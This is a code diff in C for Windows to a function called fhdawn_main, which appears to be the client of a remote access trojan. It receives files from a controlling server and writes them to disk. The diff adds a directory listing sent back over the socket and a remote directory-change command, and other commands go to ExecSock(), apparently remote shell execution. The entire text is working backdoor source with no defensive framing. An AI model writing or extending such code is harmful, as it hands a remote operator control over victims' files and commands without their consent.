@@ -88,7 +88,6 @@ void fhdawn_main(void)
             int expected = 0; // expected bytes of size
             DWORD dwBytesWritten = 0; // number of bytes written
             BOOL write; // Return value of WriteFile();
-            char* absolutePath[500];
             memset(temp, '\0', BUFFER); // Clear temp
             memset(fileinfo, '\0', 2);
             int return_code = recv(sockfd, temp, BUFFER, 0); // Receive File information from server (filename:filesize)
@@ -130,13 +129,13 @@ void fhdawn_main(void)
                 else {
                     // sockprintf(sockfd, "\n[ Received File : %s ]\n[ File Size : %s bytes ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
                     // sockprintf(sockfd, "\n[ Saved File : %s ]\n[ File Size : %i bytes ]\n", fileinfo[0], total);
-                    GetAbsolutePath(fileinfo[0], absolutePath);
                     sockprintf(
                         sockfd,
-                        "F_OK:%s:%i:%s",
+                        "F_OK,%s,%i,%s\\%s",
                         fileinfo[0],
                         total,
-                        absolutePath
+                        cDir(),
+                        fileinfo[0]
                     );
                 }
                 CloseHandle(recvfile);
@@ -279,17 +278,26 @@ void fhdawn_main(void)
             WIN32_FIND_DATA data;
             HANDLE hFind;
             hFind = FindFirstFile("*", &data);  
+            int i = 0;
+            char dir[BUFFER];
             if (hFind != INVALID_HANDLE_VALUE)
             {
+                memset(dir, 0, BUFFER);
+                snprintf(dir, BUFFER, "Listing '%s'\n-------------------\n", cDir());
                 do {
-                   
+                    int len = strlen(dir);
                     if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                        
+                        snprintf(dir + len, sizeof(dir) - len, "[DIRECTORY] %s\n", data.cFileName);
                     }
                     else {
-                       
+                        ULONGLONG FileSize = data.nFileSizeHigh;
+                        FileSize <<= sizeof(data.nFileSizeHigh) * 8;
+                        FileSize |= data.nFileSizeLow;
+                        snprintf(dir + len, sizeof(dir) - len, "[FILE] %s (%u bytes)\n", data.cFileName, FileSize);
                     }
                 } while (FindNextFile(hFind, &data));
+
+                sockSend(dir);
             }
         } 
         /*
@@ -297,6 +305,39 @@ void fhdawn_main(void)
         {
             sockSend(GetOutputData());
         }*/
+
+        else if (strcmp(recvbuf, "cd") == 0)
+        {
+            memset(recvbuf, '\0', BUFFER);
+            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
+            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
+            {
+                connected = FALSE;
+            }
+
+            if (!SetCurrentDirectory(recvbuf))
+            {
+                int x = GetLastError(); // Should this be integer?
+                // on line 22 I'm using %ld to print the error, it works, What??
+                switch (x) {
+                case 2:
+                    sockprintf(sockfd, "Error Changing Directory, File or Folder not Found (Error code %i)", x);
+                    break;
+                case 3:
+                    sockprintf(sockfd, "Error Changing Directory, Path not found (Error Code %i)", x);
+                    break;
+                case 5:
+                    sockprintf(sockfd, "Error Changing Directory, Access Denied (Error Code %i)", x);
+                    break;
+                default:
+                    sockprintf(sockfd, "Error Changing Directory, Error %i", x);
+                    break;
+                }  
+            }
+            else {
+                sockprintf(sockfd, "Directory Changed to '%s'", cDir());
+            }
+        }
         else {
             ExecSock();
         }
